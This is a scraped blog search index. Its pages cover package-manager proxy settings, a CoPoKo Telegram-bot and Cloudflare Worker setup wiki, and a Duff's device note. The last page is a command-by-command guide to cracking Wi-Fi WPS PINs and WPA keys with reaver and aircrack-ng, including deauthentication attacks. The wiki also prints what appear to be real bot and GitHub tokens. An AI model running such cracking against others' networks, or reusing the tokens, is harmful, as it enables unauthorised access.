document.querySelector(\".hole\").classList && document.querySelector(\".hole\").classList.remove(\"dark-mode\"); } else { document.querySelector(\".hole\") && document.querySelector(\".hole\").classList && document.querySelector(\".hole\").classList.add(\"dark-mode\"); } } window.HoleLoadCardCallback = ()=>{ HoleDark() volantis.dark.push(HoleDark) } .hole img { display: inline !important; }"},{"title":"Package Manager Proxy Settings","date":"2022-06-29T00:37:00.000Z","updated":"2022-06-29T01:31:00.000Z","comments":true,"path":"notes/package-manager-proxy-settings/index.html","permalink":"https://blog.mhuig.top/notes/package-manager-proxy-settings/","excerpt":"","text":"如果你的包管理器想直接使用优秀的镜像仓库，请参考这个：Thanks-Mirror pip添加至 ~/.config/pip/pip.conf ~/.config/pip/pip.conf[global]proxy=http://localhost:1087 注意不支持 socks5。 gitclone with ssh在文件 ~/.ssh/config 后添加下面两行 ~/.ssh/configHost github.com# Mac下ProxyCommand nc -X 5 -x 127.0.0.1:1080 %h %p# Linux下ProxyCommand nc --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p 注意 Linux 和 Mac 下 ncat / netcat 区别，详见： What are the differences between ncat, nc and netcat? clone with httpgit config --global http.proxy http://127.0.0.1:1087 建议使用 http, 因为 socks5 在使用 git-lfs 时会报错proxyconnect tcp: dial tcp: lookup socks5: no such host Referencelaispace / git 设置和取消代理 cargoCargo 会依次检查以下位置: 环境变量 CARGO_HTTP_PROXY export CARGO_HTTP_PROXY=http://127.0.0.1:1080 任意 config.toml 中的 http.proxy [http]proxy = \"127.0.0.1:1080\" 环境变量 HTTPS_PROXY &amp; https_proxy &amp; http_proxy export https_proxy=http://127.0.0.1:1080export http_proxy=http://127.0.0.1:1080 http_proxy 一般来讲没必要，除非使用基于 HTTP 的 Crate Repository Cargo 使用 libcurl，故可接受任何符合 libcurl format 的地址与协议 ( 127.0.0.1:1080 , http://127.0.0.1:1080, socks5://127.0.0.1:1080 ）均可 ReferenceThe Cargo Book - httpproxy apt (apt-get)在 /etc/apt/apt.conf.d/ 目录下新增 proxy.conf 文件，加入： /etc/apt/apt.conf.d/proxy.confAcquire::http::Proxy \"http://127.0.0.1:8080/\";Acquire::https::Proxy \"http://127.0.0.1:8080/\"; 如果希望使用 Socks5 代理，则加入： /etc/apt/apt.conf.d/proxy.confAcquire::http::Proxy \"socks5h://127.0.0.1:8080/\";Acquire::https::Proxy \"socks5h://127.0.0.1:8080/\"; Reference apt.conf \"Acquire::http:Proxy \"proxyserver:port\" seems not to be used socks5 vs socks5h curl添加至 ~/.curlrc。 ~/.curlrcsocks5 = \"127.0.0.1:1080\" Gradle添加至 ~/.gradle/gradle.properties ~/.gradle/gradle.propertiessystemProp.http.proxyHost=127.0.0.1systemProp.http.proxyPort=1087systemProp.https.proxyHost=127.0.0.1systemProp.https.proxyPort=1087 ReferenceGradle proxy configuration Maven添加至 %Maven 安装目录%/conf/settings.xml。 % Maven 安装目录 %/conf/settings.xml&lt;!-- proxies | This is a list of proxies which can be used on this machine to connect to the network. | Unless otherwise specified (by system property or command-line switch), the first proxy | specification in this list marked as active will be used. |--&gt;&lt;proxies&gt; &lt;!-- proxy | Specification for one proxy, to be used in connecting to the network. | &lt;proxy&gt; &lt;id&gt;optional&lt;/id&gt; &lt;active&gt;true&lt;/active&gt; &lt;protocol&gt;http&lt;/protocol&gt; &lt;username&gt;proxyuser&lt;/username&gt; &lt;password&gt;proxypass&lt;/password&gt; &lt;host&gt;proxy.host.net&lt;/host&gt; &lt;port&gt;80&lt;/port&gt; &lt;nonProxyHosts&gt;local.net|some.host.com&lt;/nonProxyHosts&gt; &lt;/proxy&gt; --&gt; &lt;proxy&gt; &lt;id&gt;proxy&lt;/id&gt; &lt;active&gt;true&lt;/active&gt; &lt;protocol&gt;http&lt;/protocol&gt; &lt;host&gt;127.0.0.1&lt;/host&gt; &lt;port&gt;1087&lt;/port&gt; &lt;/proxy&gt;&lt;/proxies&gt; ReferenceGuide-proxies go getHTTP_PROXY=socks5://localhost:1080 go get 测试了下 HTTPS_PROXY 和 ALL_PROXY 都不起作用，或可使用：goproxy.io npmnpm config set proxy http://127.0.0.1:1087npm config set https-proxy http://127.0.0.1:1087 用 socks5 就报错。推荐使用 yarn，npm 是真的慢。 reference Is there a way to make npm install (the command) to work behind proxy? NPM Binary 镜像配置 rustupexport https_proxy=http://127.0.0.1:1080 yarnyarn config set proxy http://127.0.0.1:1087yarn config set https-proxy http://127.0.0.1:1087 不支持 socks5 Referenceyarn 需要像 npm 一样配置代理么？ yarn2Yarn 2+ - Official yarn config set httpProxy http://127.0.0.1:1087yarn config set httpsProxy http://127.0.0.1:1087 不支持全局设置，支持 socks5。 提示: 这个命令会修改项目目录下的 .yarnrc.yml 文件, 请留意不要把带有如: .yarnrc.ymlhttpsProxy: \"socks5://127.0.0.1:1080\" 的代码提交到仓库, 以免造成麻烦 建议使用 npm 镜像而不是配置使用代理 yarn config set npmRegistryServer https://127.0.0.1:1087注意: 此方法不适用于下载 yarn 官方插件! yarn 的官方插件默认会从 GitHub (raw.githubusercontent.com) 上下载，您可能依旧需要配置代理。 Reference yarn doc - httpProxy yarn doc - httpsProxy gem添加至 ~/.gemrc。 .gemrc---# See 'gem help env' for additional options.http_proxy: http://localhost:1087 brew设置环境变量： ALL_PROXY=socks5://localhost:1080 wget添加至 ~/.wgetrc。 .wgetrcuse_proxy=yeshttp_proxy=127.0.0.1:1087https_proxy=127.0.0.1:1087 ReferenceHow to set proxy for wget? snapsudo snap set system proxy.http=\"http://127.0.0.1:1087\"sudo snap set system proxy.https=\"http://127.0.0.1:1087\" ReferenceHow to install snap packages behind web proxy docker$ sudo mkdir -p /etc/systemd/system/docker.service.d$ sudo vim /etc/systemd/system/docker.service.d/proxy.conf[Service]Environment=\"ALL_PROXY=socks5://localhost:1080\"$ sudo systemctl daemon-reload$ sudo systemctl restart docker 必须是 socks5，http 不生效 Electron Dev Dependency设置环境变量 ELECTRON_GET_USE_PROXY=trueGLOBAL_AGENT_HTTPS_PROXY=http://localhost:1080 References Advanced Installation Instructions global-agent Visual Studio Code Remote (WSL2)WSL2 环境下可以通过设置 ~/.vscode-server/server-env-setup 脚本文件，设置开发环境的环境变量，使用代理。 WSL2 内环境访问 Win 下的代理程序端口代理 (例子代码中 http 代理端口监听 17070)，因为子网地址每次启动都不一样，需要动态处理。 新建~/.vscode-server/server-env-setup文件，该文件会在 VSCode 启动 WSL 环境后被source。 server-env-setupWSL_HOST=$(sed -n '/^nameserver/p' /etc/resolv.conf | cut -d' ' -f2)export http_proxy=http://${WSL_HOST}:17070export https_proxy=$http_proxyexport all_proxy=$http_proxy ReferencesDeveloping in WSL Visual Studio Code Remote (SSH)VSCode SSH 后的环境不会使用本地界面 VSCode 内的代理设置，如果 SSH 主机没有默认网络链接或在墙内，会导致问题。 SSH 主机无网络需要手动下载 vscode 的 server 端传输部署。详情见链接 How can I install vscode-server in linux offline [duplicate] download-vs-code-server.sh SSH 主机在墙内虽然文档未提及，但是可以使用 WSL 模式的方案，配置 ~/.vscode-server/server-env-setup 文件设置代理。 SSH 主机有代理程序监听在 17070 端口： 新建 ~/.vscode-server/server-env-setup 文件，该文件会在 VSCode 启动 WSL 环境后被 source。 server-env-setupexport http_proxy=http://127.0.0.1:17070export https_proxy=$http_proxyexport all_proxy=$http_proxy ReferencesRemote Development using SSH Scoopscoop config proxy 127.0.0.1:1080 ReferenceUsing Scoop behind a proxy OpenWRT opkg在 LUCI 面版菜单配置或者 /etc/opkg.conf 末尾追加 /etc/opkg.confoption http_proxy http://localhost:1080/ References[OpenWrt Wiki] Opkg package manager Chocolatey从 0.9.9.9 版本开始，choco 支持在配置文件显式配置代理。 # 设置代理choco config set proxy http://localhost:8888# 取消代理choco config unset proxy 除此之外，从 0.10.4 版本开始，choco会自动寻找http_proxy和https_proxy或者noproxy环境变量，通过在命令行临时设置环境变量的方式也可以方便调整choco的代理设置。 ReferenceChocolatey Software Docs | Use Chocolatey w/Proxy Server"},{"title":"安装配置 Space","date":"2022-06-12T08:27:00.000Z","updated":"2022-06-13T01:12:00.000Z","comments":true,"path":"wiki/CoPoKo/a.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/a","excerpt":"","text":"CoPoKo 目前仅限部署于 CloudFlare Workers。 我们假设您已经安装了 CloudFlare Workers，您已经在 CloudFlare Workers 上注册了一个新的账户。并且您已经在 CloudFlare DNS 上创建了一个新的域名。 前期准备 在 cloudflare 官网注册账号，找到并开通使用 workers。 安装 git，安装方法请参考搜索引擎。 安装 Node.js 和 npm，安装方法请参考搜索引擎。打开命令行（windows 用户可直接在资源管理器输入 cmd 并回车）如果在命令行输入以下命令成功输出版本号，即安装成功。node -vnpm -v 安装 Wranglernpm install -g wrangler 请参阅详细的安装说明。如果在命令行输入以下命令成功输出版本号，即安装成功。wrangler -v 使用您的 Cloudflare 帐户对 Wrangler 进行身份验证要启用部署到 Cloudflare，您需要通过 Wrangler 登录到您的 Cloudflare 帐户来进行身份验证。wrangler login 当 Wrangler 自动打开浏览器显示 Cloudflare 的同意屏幕时，请单击允许按钮。这会向 Wrangler 发送 API 令牌。 安装部署 CoPoKo / SpaceCoPoKo/Space 包含核心模块 Telegram 机器人和控制面板。 克隆 CoPoKo / Space 项目并解压 git clone https://github.com/CoPoKo/Space.git 复制 wrangler.toml.template 内容建立新配置文件 wrangler.toml 修改配置文件可参考 cloudflare 官方文档account_id：您的 Cloudflare 帐户 ID, 详见下文 ACCOUNTID。name：您的 Cloudflare Worker 名称route：您的 Cloudflare Worker 路由kv_namespaces：您的 Cloudflare KV在文件夹目录打开命令行运行以下命令, 创建一个 KV 桶： wrangler kv:namespace create \"SpaceKV\" 根据提示将输出的内容粘贴在 wrangler.toml 文件中 kv_namespaces 位置。 修改配置文件 [vars] 配置 (1) 添加您的 Worker 信息 WORKERNAME : Worker 名称，同上文 name WORKERROUTE : Worker 路由， 同上文 route (2) 添加您的 Cloudflare 帐户信息 AUTHEMAIL : Cloudflare 帐户邮箱 AUTHKEY : CloudFlare 的 Global API Key 在这里获取 ACCOUNTID : Cloudflare 帐户 ID, Worker 界面中的账户 ID ZONEID : Worker 路由域名区域 ID ，转到 网站 》您的域名 》概述 右下角 (3) 添加您的 控制面板配置信息 AUTH_PAGE : 控制面板登录页面地址 （随便写个例如 /AUTH_PAGE1919810） MY_REFERER : 控制面板 API 请求的 Referer 检查字段 可以为空但是不可以填错 错误的 Referer 会返回 403 SpaceName : 控制面板登录用户名 SpacePassword : 控制面板登录密码 (4) 添加您的 reCAPTCHA 信息 到 这里 注册一个 API 密钥对 reCAPTCHA_CLIENT : reCAPTCHA 客户端秘钥 reCAPTCHA_SERVER : reCAPTCHA 服务端秘钥 (5) 添加您的 COPOKO_API 配置信息 COPOKO_API : CoPoKo API 详见后文。 将 CoPoKo/service-api-by-vercel 部署到 vercel 并获取路径为COPOKO_API的值，你可以使用配置文件中我部署的公共 API，资源有限请合理使用。 安装配置 service api/wiki/CoPoKo/b (6) 添加您的 Telegram 机器人 配置信息 Telegraf_BOT_TOKEN : Telegram 机器人秘钥 详见后文。 Telegraf_BOT_WEBHOOK : Telegram 机器人 WEBHOOK （随便写个例如 /Telegraf_BOT_WEBHOOK114514 记住这个配置后面还会用到） 安装配置 Telegram 机器人/wiki/CoPoKo/c (7) 其他配置信息 AES_KEY : AES 加密秘钥，建议手滚键盘。丢失秘钥即为丢失数据。 请不要向任何人公开您的配置信息。请将配置文件视为机密。 发布wrangler publish"},{"title":"开放 API 接口","date":"2022-06-13T03:10:00.000Z","updated":"2022-09-03T01:42:00.000Z","comments":true,"path":"wiki/CoPoKo/api.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/api","excerpt":"","text":"假定您的 Worker 路由是 https://example.workers.dev/。 浏览器访问 https://example.workers.dev/ 这里列举了几个 开放 API 接口，实际上不止这几个，详见源码。 笔者在这里简单列举一下。 必应图片API 路径： https://example.workers.dev/bing 参数：?day=&lt;Number&gt;0-6，0 表示今天，1 表示明天，依次类推。 https://example.workers.dev/bing?day=3 获取图片https://example.workers.dev/bing/info?day=3 获取图片详细信息https://example.workers.dev/bing/copyright?day=3 获取图片版权信息 SitichAPI 路径： https://example.workers.dev/sitich 毒鸡汤API 路径： https://example.workers.dev/soul 一言API 路径： https://example.workers.dev/hitokoto Unsplash 图片API 路径： https://example.workers.dev/unsplash 参数：?keywords=&lt;S&gt;,&lt;S&gt;,&lt;S&gt; https://example.workers.dev/unsplash?keywords=cat,dog,bird ACG 图片API 路径： https://example.workers.dev/acg 访问 IP 信息API 路径： https://example.workers.dev/ipinfo IPFSAPI 路径： https://example.workers.dev/ipfs OPEN CDNAPI 路径： https://example.workers.dev/npm/ ：unpkg.comhttps://example.workers.dev/gh/ ：fastly.jsdelivr.nethttps://example.workers.dev/wp/ ：fastly.jsdelivr.nethttps://example.workers.dev/twemoji/ ：twemoji.maxcdn.comhttps://example.workers.dev/gitraw/ ：raw.githubusercontent.comhttps://example.workers.dev/gist/ ：gist.github.comhttps://example.workers.dev/ajax/libs/ ：cdnjs.cloudflare.com Github EventAPI 路径： https://example.workers.dev/github-event 调色板API 路径： https://example.workers.dev/color DNS 查询API 路径： https://example.workers.dev/dns/ali/get/host?name=github.com /dns/:upstream:/:way:/:host:?name=xxx&amp;type=xxx&amp;edns_client_subnet=x.x.x.x/dns/dns/get/dns/ali/get/host 参数 参数用途 name 需要解析的域名 type 解析形式, A or AAAA or CNAME 等等 edns_client_subnet EDNS 的 ip, 默认开启为本机 ip, 开启此项功能可提高解析精准度. way 获取方式，默认 doh 方式，可使用以下参数: doh get host 是否转化为host格式 [仅在 type 为 A 或 AAAA 格式下生效] upstream 上游 DNS 解析, 默认为 CloudFlare 回源 &lt; 1ms 可使用以下参数: google ali dnspod 注：DoH 推荐直接选用 https://dns.alidns.com/dns-query ，而不是用本 API 的反代接口"},{"title":"安装配置 Service Api","date":"2022-06-13T01:12:00.000Z","updated":"2022-09-03T01:42:00.000Z","comments":true,"path":"wiki/CoPoKo/b.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/b","excerpt":"","text":"笔者假设您已经注册了 vercel 服务，并知道如何使用它。 在实际的开发中发现 CloudFlare Workers 存在种种限制，例如它不支持 nodejs 环境，存在 CPU 运行时间限制等等，所以我将存在 CPU 运行时间限制的部分放到了 Vercel 上部署。 将 CoPoKo/service-api-by-vercel 部署到 vercel 并获取路径为配置文件中 COPOKO_API 的值，你可以使用配置文件中我部署的公共 API，资源有限请合理使用。 注：关于不支持 nodejs 环境，我随便说几句，可以使用 browserify 解决，如果你使用了 webpack 直接推荐 node-polyfill-webpack-plugin，这里吐槽一下 browserify 的 net tls 库已经六年没更新了，甚至不支持 es6. 当然换个思路可以将 CloudFlare Workers 迁移到其他平台，简而言之就是添加 node-fetch 的 polyfill，例如 mpl.js. 公共 API我部署了一个公共 API，你可以直接使用它，资源有限请合理使用。 https://api.copoko.vercel.app 注：Vercel 免费计划有 100 GB / 月 使用限制，当达到限制后我将关闭公共 API。 部署 service api 点击上方按钮，跳转至 Vercel 进行部署。 如果你未登录的话，Vercel 会让你注册或登录，请使用 GitHub 账户进行快捷登录。 此处省略一万字。 部署成功后，直接访问路径为配置文件中 COPOKO_API 的值即可。"},{"title":"","date":"2025-11-10T11:28:12.619Z","updated":"2025-11-10T11:28:12.619Z","comments":false,"path":"pages/timeline/index.html","permalink":"https://blog.mhuig.top/pages/timeline/","excerpt":"","text":"博客大事记 大事记Long Long Ago博客大事记 2022.09.06 PDF 标签实现懒加载 2022.05.13 全站内容按照体系整理 创建 Notes 页面 2022.05.08 图片压缩使用 webp 格式 全站 webp 时代 2022.02.14 更新使用 GitHub Issues 友链系统 2022.02.13 本站 CDN cdn.jsdelivr.net 使用 Cloudflare 加速: static.mhuig.top 2021.10.11 启用 Giscus 评论系统 2021.10.12 创建 博客大事记页面 很久很久以前Wikipedia"},{"title":"安装配置 Telegram 机器人","date":"2022-06-13T01:12:00.000Z","updated":"2022-06-13T02:34:00.000Z","comments":true,"path":"wiki/CoPoKo/c.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/c","excerpt":"","text":"笔者假设您已经注册了 Telegram 账户，并知道如何使用它。 此处可能需要一些魔法 创建 Telegram 机器人账户和 @BotFather 对话，使用 /newbot 命令进行创建，根据要求进行设定, 我们需要的是创建成功后返回的 the token to access the HTTP API。这个 token 就是我们需要的 CoPoKo / Space 配置文件中的Telegraf_BOT_TOKEN。 笔者在这里创建了 CoCo。 配置 机器人 WEBHOOK还记得之前在 CoPoKo / Space 配置文件中的 Telegraf_BOT_WEBHOOK吗？ 我们通过浏览器访问以下路径进行配置 https://api.telegram.org/bot&lt;token&gt;/setWebhook?url=&lt;url&gt; 其中 &lt;token&gt; 是 CoPoKo / Space 配置文件中的 Telegraf_BOT_TOKEN，&lt;url&gt; 是我们的机器人的 Webhook 路径。例如： https://api.telegram.org/bot2044977018:AAHbt-RyEklq3MDG0w6HqrO84lS7MaWz_Gz/setwebhook?url=https://example.workers.dev/Telegraf_BOT_WEBHOOK114514 配置群组访问权限 如果不建立群组，则忽略此步骤。 和 @BotFather 对话, /mybots 命令可以查看所有的机器人。 在 Bot Settings 中配置： Allow Groups : enabled Groups Privacy : disabled"},{"title":"Calendar","date":"2022-06-13T07:40:00.000Z","updated":"2022-06-13T08:19:00.000Z","comments":true,"path":"wiki/CoPoKo/calendar.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/calendar","excerpt":"","text":"假定您的 Worker 路由是 https://example.workers.dev/。 笔者这里默认您会使用日历。 简介众所周知，ToDo 都是用来咕咕咕的。 配置信息暂无配置。 使用Telegram 机器人部分咕咕咕了。 CoPoKo Space 部分直接上图："},{"title":"CoPoKo Space 初体验","date":"2022-06-13T02:35:00.000Z","updated":"2022-06-13T03:02:00.000Z","comments":true,"path":"wiki/CoPoKo/d.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/d","excerpt":"","text":"笔者假设您已经顺利完成了前面的所有步骤；并且您的 CoPoKo Space 已经安装完成。 假定您的 Worker 路由是 https://example.workers.dev/。 开放 API 接口浏览器访问 https://example.workers.dev/ 这里列举了几个 开放 API 接口，实际上不止这几个，详见源码。 登录 CoPoKo Space假定您的 AUTH_PAGE 配置是 /AUTH_PAGE1919810。 浏览器访问 https://example.workers.dev/AUTH_PAGE1919810 输入 username 和 password，点击 Sign in 登录。 username 和 password 分别是之前配置的 SpaceName 和 SpacePassword。 登录成功后，您会看到一个 CoPoKo Space 的 Home 页。 Space Setting 基本操作点击 Setting 选项卡。 点击 Add Project。 输入 project 名称，点击 Add 点击加号图标 + 展开项目设置。 点击 Add KV，输入 key Value 点击 Add。"},{"title":"","date":"2022-06-12T08:27:00.000Z","updated":"2022-06-12T08:27:00.000Z","comments":true,"path":"wiki/CoPoKo/index.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/","excerpt":"","text":"CoPoKo CoPoKo CoPoKo 是一系列开源工具包，由核心模块 Telegram 机器人和控制面板, 以及周边工具和系统接口组成。简而言之，CoPoKo 是 MHuiG 捣鼓的一堆破烂玩意儿。 Why谁不想拥有一个可爱的机器人助手呢？ 喵喵喵https://t.me/+Xy1JwLq4rWo1M2M1 许可协议CoPoKo 采用 GPL3.0 Only 开源许可协议。 CoPoKoCopyright (C) 2018 CoPoKo TeamThis program is free software: you can redistribute it and/or modifyit under the terms of the GNU General Public License as published bythe Free Software Foundation, either version 3 of the License, or(at your option) any later version.This program is distributed in the hope that it will be useful,but WITHOUT ANY WARRANTY; without even the implied warranty ofMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See theGNU General Public License for more details.You should have received a copy of the GNU General Public Licensealong with this program. If not, see &lt;https://www.gnu.org/licenses/&gt;."},{"title":"Maxwell","date":"2022-06-13T08:37:00.000Z","updated":"2022-06-13T08:37:00.000Z","comments":true,"path":"wiki/CoPoKo/maxwell.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/maxwell","excerpt":"","text":"假定您的 Worker 路由是 https://example.workers.dev/。 简介CoPoKo Maxwell's demon CoPoKo/Maxwell 是评论系统！！！ 配置信息暂无 使用咕咕咕。"},{"title":"NPM Upload","date":"2022-06-13T05:50:00.000Z","updated":"2022-06-13T05:50:00.000Z","comments":true,"path":"wiki/CoPoKo/npm-upload.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/npm-upload","excerpt":"","text":"假定您的 Worker 路由是 https://example.workers.dev/。 笔者这里默认您会使用 npm 发布 package。 简介黑盒：将资源上传到 npm，并返回 CDN 链接。 Static Files =&gt; CoPoKo Space/Telegram Bot =&gt; Cloudflare Worker =&gt; GitHub Actions =&gt; NPM =&gt; CDN 配置信息导入 CoPoKo / Whiteholehttps://github.com/CoPoKo/Whitehole/generate 点击上方链接，这将从 CoPoKo/Whitehole 使用模板导入项目。 请不要尝试 fork CoPoKo / Whitehole 这个项目，这可能直接让你进入笔者的 GitHub 黑名单中。 修改 https://github.com/CoPoKo/Whitehole/blob/main/npm-version-bump.js 为您自己的 npm package 信息，与下文配置对应。 在设置中打开 actions，打开 actions 写入权限 settings &gt; secrets &gt; actions 添加环境变量 NPM_TOKEN，这是你的 NPM 发布秘钥。 https://example.workers.dev/space/dash/setting 打开 Setting 面板，新建一个 Project 名为 NPMUpload。 GITHUB_TOKEN ：你的 GITHUB 秘钥 需要写入 repo 权限 例如： ghp_pX3DeRmfBkBlRXrpEtJls6upx22UDx4BxHixGITHUB_BRANCH ：GITHUB 分支名称 例如：mainGITHUB_REPO ：GITHUB 仓库名称 例如：CoPoKo/WhiteholeNPM_PKG ：npm 包名称 例如：@copoko/whitehole，与上文 npm-version-bump.js 配置对应。 使用这里以上传一个 vue.js 为例。 CoPoKo Space 选择文件然后点击 提交 按钮即可。 在 CoPoKo Space Home 页面，你甚至还可以查看到上传的文件记录。 Telegram 机器人 默认配置只允许 admin 上传, 如果笔者没有记错的话。"},{"title":"问答系统","date":"2022-06-13T06:54:00.000Z","updated":"2022-09-03T01:42:00.000Z","comments":true,"path":"wiki/CoPoKo/qa.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/qa","excerpt":"","text":"假定您的 Worker 路由是 https://example.workers.dev/。笔者这里默认您会使用 Telegram。 简介问答系统是指 Telegram 机器人的 QA 系统。 面板配置信息https://example.workers.dev/space/dash/setting 打开 Setting 面板，新建一个 Project 名为 TelegrafBot。 ADMIN_ID: 管理员用户 ID [https://t.me/userinfobot]ADMIN_GROUP_ID: 私有群组 IDPUBLIC_GROUP_ID: 公开群组 IDTEST_GROUP_ID: 测试群组 ID 这里有三个 GROUP ID，分别是私有群，公开群，测试群；ID 是数字。如何获取群组 ID，请参考下文输入命令 &gt;ChatID。测试群是笔者开发测试使用，私有群中会有 Telegram 机器人的报错日志信息。 问答系统的配置文件问答系统的配置文件是 yml 格式https://github.com/CoPoKo/Space/blob/main/src/Space/TelegrafBot/BotModel/Text/workflows.yml - workflow: - random: 1 reply: 然后呢? - re: ^？$ reply: ？？？ - includes: - 来点 - 涩图 reply: 让我找找 - random: 100 action: EmojiToSticker workflow 被称为工作流，每一个工作流都是一个判断列表，一个工作流中只能有一个 action 被触发，触发后跳出执行下一个工作流。 action 被称为动作，每一个动作都是一个函数，动作的函数名称是 action: 后面的函数名称。 reply 是一种特殊的动作，它的动作是 reply: 后面的文本。 re 是一个正则表达式判断条件。 includes 是一个正则表达式列表判断条件，必须全部满足才会触发 action。 random 是一个随机触发判断条件，赋值 0-100。 - workflow: - admin: - re: 在吗 reply: 主人我在 else: - re: 在吗 reply: 爪巴 admin 是一个管理员判断条件，匹配 ADMIN_NAME 配置信息中的用户名，如果匹配则触发 admin 工作流，否则触发 else 工作流。 - workflow: - cmd: help reply: no help - cmd: unsplash arg: k: nature,water,sky,blue,sea action: Unsplash cmd 是命令判断条件，匹配 cmd 配置信息中的命令。 命令以 &gt; 开头。arg 是 action 中的默认参数列表。参数以 - 开头，或者按照顺序排列可以省略 - （但是省略 - 会有 bug）。例如： &gt;unsplash &gt;unsplash -k cat &gt;unsplash dog 使用此处省略一万字，请读者自行探索。 喵喵喵https://t.me/+Xy1JwLq4rWo1M2M1"},{"title":"RSS 订阅","date":"2022-06-13T07:40:00.000Z","updated":"2022-06-13T07:40:00.000Z","comments":true,"path":"wiki/CoPoKo/rss.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/rss","excerpt":"","text":"假定您的 Worker 路由是 https://example.workers.dev/。 笔者这里默认您会使用 RSS。 简介简单的 RSS 订阅，可以用来获取的最新的一次更新。 配置信息一个定时任务，笔者还没有将它抽离出配置文件，咕咕咕？？？ 先上代码。 https://github.com/CoPoKo/Space/blob/main/src/Space/Scheduled.ts 使用CoPoKo Space 进入 RSS Subscribe 选项卡，添加 rss 链接即可。同时可查看最近的一篇的内容，没有样式、没有图片嘿嘿嘿。 可以管理状态和通知。 Telegram 机器人 默认配置只允许 admin 命令操作。 显示订阅列表： &gt;rss&gt;rss list 添加订阅 rss： &gt;rss add https://xxxxxxxxx/rss.xml 删除订阅 rss： &gt;rss delete tittle&gt;rss delete https://xxxxxxxxx/rss.xml 尝试更新订阅（这其实是定时任务干的活）： &gt;rss update 拉取最新订阅： &gt;rss last 当有更新时或者拉取最新订阅时，Home 页面也会提醒您。"},{"title":"","date":"2025-11-10T11:28:12.616Z","updated":"2025-11-10T11:28:12.616Z","comments":false,"path":"pages/time-machine/index.html","permalink":"https://blog.mhuig.top/pages/time-machine/","excerpt":"","text":"Time Machine Youth Youth is not a time of life; it is a state of mind; 青春不是年华，青春是一种心境。 it is not a matter of rosy cheeks, red lips and supple knees; 它不是红颜，朱唇，柔膝； it is a matter of the will, a quality the imagination, 它是一种深沉的意志，一种恢弘的想象， a vigor of the emotions; 和饱满的热情； it is the freshness of the deep springs of life. 它是我们生命之泉在不息的涌动。 Nobody grows old merely by a number of years. 岁月有加，并未垂老。 We grow old by deserting our ideals. 抛弃理想，方堕暮年。"},{"title":"Search","date":"2022-06-13T04:57:00.000Z","updated":"2022-06-13T05:49:00.000Z","comments":true,"path":"wiki/CoPoKo/search.html","permalink":"https://blog.mhuig.top/wiki/CoPoKo/search","excerpt":"","text":"假定您的 Worker 路由是 https://example.workers.dev/。 简介 CoPoKo Space Search 模块是一个搜索功能，包含 Google 可编程搜索和 WolframAlpha。 配置信息https://example.workers.dev/space/dash/setting 打开 Setting 面板，新建两个 Project 名为 GoogleSearch 、WolframAlpha。 Google 可编程搜索进入 Google 可编程搜索控制台，新建一个搜素引擎。语言设置中文，地区中国。 在 公开网址中找到参数 CX在 自定义搜索 JSON API 中找到参数 KEY 此处省略一万字。 WolframAlpha进入 developer.wolframalpha.com 创建并获取一个 APPID 此处省略一万字。 使用CoPoKo Space 输入关键词即可搜素 Telegram 机器人 输入英文冒号 + 关键词即可搜索 WolframAlpha"},{"title":"Duff's Device","date":"2022-09-02T07:09:00.000Z","updated":"2022-09-02T07:09:00.000Z","comments":true,"path":"notes/c/c/duff-device.html","permalink":"https://blog.mhuig.top/notes/c/c/duff-device","excerpt":"","text":"一个循环复制的函数实现: void NormalCopy(char *to,char* from,int count){ do { *to = *from++; } while (--count&gt;0);} 用 Duff's device 方法改写后的代码: void DuffDev(char *to, char *from, int count){ int n = (count + 7) / 8; switch (count % 8) { case 0: do{ *to++ = *from++; case 7: *to++ = *from++; case 6: *to++ = *from++; case 5: *to++ = *from++; case 4: *to++ = *from++; case 3: *to++ = *from++; case 2: *to++ = *from++; case 1: *to++ = *from++; } while (--n &gt; 0); }} 时间要回到 1983 年，那是一个雨过天晴的夏天，在卢卡斯影业上班的程序员 Tom Duff，他是想为了加速一个实时动画程序，实现从一个数组复制数据到一个寄存器这样一个功能 但是达夫洞察到，若在这一过程中将一条 switch 和一个循环相结合，则可展开循环，应用的是 C 语言里面 case 标签的 Fall through 特性，实际就是没有 break 继续执行。 #include &lt;iostream&gt;using namespace std;int main() { int n = 3; switch (n) { case 0: do { cout &lt;&lt; \" 0 \" &lt;&lt; endl; case 1: cout &lt;&lt; \" 1 \" &lt;&lt; endl; case 2: cout &lt;&lt; \" 2 \" &lt;&lt; endl; case 3: cout &lt;&lt; \" 3 \" &lt;&lt; endl; } while (--n &gt; 0); }} 这段代码的主体还是 do-while 循环，但这个循环的入口点并不一定是在 do 那里，而是 switch(n)，把循环的入口定在了几个 case 标号那里。"},{"title":"拿取路由器 Pin 码","date":"2022-09-09T08:59:00.000Z","updated":"2022-09-10T04:02:00.000Z","comments":true,"path":"notes/c/k/pin.html","permalink":"https://blog.mhuig.top/notes/c/k/pin","excerpt":"","text":"拿 pin 码就可以直接跑出 WPA PSK 网卡监控模式airmon-ng start wlan0 扫描wash -i wlan0mon 破 pin 网卡 物理地址 信道reaver -i wlan0mon -b 00:5A:13:40:AA:F8 -c 11 -vv -K 0 直接拿到 pin 了 通过 pin 获得 wifi 密码 网卡 物理地址 pin码reaver -i wlan0mon -b 78:A1:06:B6:2A:42 -p 92975934 附录aircrack-ng - 命令清单 airmon-ng start [网卡] # 开启monitor模式airodump-ng [网卡] # 捕获附件的wifi信息airodump-ng -c [信道] --bssid [路由器MAC] -w [handshake-path] [网卡]aireplay-ng -0 [攻击次数值] -c [某连接设备MAC] -a [路由器MAC] [网卡]aircrack-ng -w [字典-path] [破解的目标握手包-path]airmon-ng stop [网卡] # 退出monitor模式 ifconfig -a 查看网卡airmon-ng start wlan0airodump-ng wlan0mon 监听网络，完了 Ctrl + C 退出 主要参数说明： # BSSID ：路由器、AP的MAC地址# PWR ：信号强度，一看就是越小越强了# Data ：传输的数据大小，大的可能在下载或看视频什么的# CH ：无线信道，要看准# ENC ：加密协议，自WPA2协议爆出重大安全漏洞，现已经出WPA3，坐等更新# ESSID 